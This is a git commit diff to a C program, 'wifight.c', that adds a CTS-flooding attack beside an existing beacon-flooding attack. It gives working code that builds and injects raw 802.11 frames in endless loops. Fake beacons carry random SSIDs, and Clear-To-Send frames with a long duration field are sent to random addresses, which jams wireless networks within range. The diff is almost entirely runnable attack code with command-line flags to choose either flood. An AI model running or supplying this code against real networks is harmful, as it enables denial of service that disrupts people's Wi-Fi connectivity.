a5c53a3d04953898ca9dd3090baa2ac059fd70cf
Matteo Croce <matteo@openwrt.org>
2015-09-28 17:53:04 +0200

    add CTS attack

--- wifight.c
+++ wifight.c
@@ -37,6 +37,14 @@ struct __attribute__ ((__packed__)) mgmt {
 	uint16_t capabilities;
 };
 
+struct __attribute__ ((__packed__)) cts {
+	struct radiotap radiotap;
+	uint8_t type;
+	uint8_t flags;
+	uint16_t duration;
+	uint8_t raddr[6];
+};
+
 struct __attribute__ ((__packed__)) beacon {
 	struct radiotap radiotap;
 	struct wifi wifi;
@@ -95,34 +103,14 @@ char ** load_words(char *path, int *lines)
 	return words;
 }
 
-int main(int argc, char *argv[])
+enum attack {
+	INVALID,
+	BEACON,
+	CTS
+};
+
+void beaconize(pcap_t *pcap, char *words[], int lines)
 {
-	char c;
-	pcap_t *pcap;
-	int lines;
-	char **words;
-
-	while((c = getopt(argc, argv, "f:")) != -1) {
-		switch(c) {
-		case 'f':
-			words = load_words(optarg, &lines);
-			printf("Loaded %d words\n", lines);
-			break;
-		}
-	}
-	if(optind != argc - 1 || !lines) {
-		fprintf(stderr, "usage: %s -f <file> <iface>\n", argv[0]);
-		return 1;
-	} else {
-		char errbuf[PCAP_ERRBUF_SIZE];
-		pcap = pcap_open_live(argv[optind], 96, 0, 0, errbuf);
-		if(!pcap) {
-			perror("pcap_create");
-			return 1;
-		}
-		srand(time(NULL));
-	}
-
 	char buf[MTU] = {0};
 	struct beacon *template = (struct beacon *)buf;
 	template->radiotap.length = 0x0008;
@@ -132,8 +120,6 @@ int main(int argc, char *argv[])
 	template->mgmt.interval = 0x0064;
 	template->mgmt.capabilities = 0x0401;
 
-	/* inject */
-	printf("beaconing on %s...\n", argv[optind]);
 	while(1) {
 		char *word = words[rand() % lines];
 		template->essid.length = strlen(word);
@@ -148,8 +134,70 @@ int main(int argc, char *argv[])
 		memcpy(template->wifi.bssid, mac, 6);
 		strcpy((char *)&template->essid.data, word);
 		template->essid.length = strlen(word);
-		if(!pcap_inject(pcap, template, sizeof(struct beacon) + template->essid.length))
-			return 0;
-		// usleep(100000);
+		if(!pcap_inject(pcap, template, sizeof(*template) + template->essid.length))
+			exit(0);
+	}
+}
+
+void ctsize(pcap_t *pcap)
+{
+	struct cts cts = {0};
+	cts.radiotap.length = 0x0008;
+	cts.type = 0xc4;
+	cts.duration = 0x7d00;
+	while(1) {
+		char mac[6] = {rand() & 0xfe, rand(), rand(), rand(), rand(), rand()};
+		memcpy(cts.raddr, mac, 6);
+		if(!pcap_inject(pcap, &cts, sizeof(cts)))
+			exit(0);
+	}
+}
+
+int main(int argc, char *argv[])
+{
+	char c;
+	pcap_t *pcap;
+	int lines;
+	char **words;
+	enum attack attack = INVALID;
+
+	while((c = getopt(argc, argv, "bcf:")) != -1) {
+		switch(c) {
+		case 'f':
+			words = load_words(optarg, &lines);
+			printf("Loaded %d words\n", lines);
+			break;
+		case 'b':
+			attack = BEACON;
+			break;
+		case 'c':
+			attack = CTS;
+			break;
+		}
+	}
+	if(optind != argc - 1 || attack == INVALID || attack == BEACON && !lines) {
+		fprintf(stderr, "usage: %s -b -f <file> <iface>\n", argv[0]);
+		fprintf(stderr, "usage: %s -c <iface>\n", argv[0]);
+		return 1;
+	} else {
+		char errbuf[PCAP_ERRBUF_SIZE];
+		pcap = pcap_open_live(argv[optind], 96, 0, 0, errbuf);
+		if(!pcap) {
+			perror("pcap_create");
+			return 1;
+		}
+		srand(time(NULL));
+	}
+
+	/* inject */
+	switch(attack) {
+	case BEACON:
+		printf("beaconing on %s...\n", argv[optind]);
+		beaconize(pcap, words, lines);
+		break;
+	case CTS:
+		printf("CTSing on %s...\n", argv[optind]);
+		ctsize(pcap);
+		break;
 	}
 }
